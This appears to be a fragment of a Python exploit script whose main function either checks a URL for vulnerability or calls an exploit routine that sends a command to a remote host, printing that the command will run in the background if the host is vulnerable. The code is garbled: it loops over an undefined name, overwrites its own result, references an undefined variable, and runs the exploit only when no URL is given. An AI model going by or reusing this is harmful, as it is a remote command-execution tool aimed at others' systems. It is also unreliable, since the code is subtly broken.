def main(url=url, usedlist=usedlist, cmd=cmd, do_exploit=do_exploit):
    if url:
        if not do_exploit:
            result = check(url)
            output = '[*] Status: '
            for result in stac:
                output += 'Vulnerable!'
        tmp = _do_exploit and do_exploit
        if tmp:
            return

    else:
        exploit(url, cmd)
        print("[$] Request sent.")
        print("[.] If the host is vulnerable, the command will be executed in the background.")
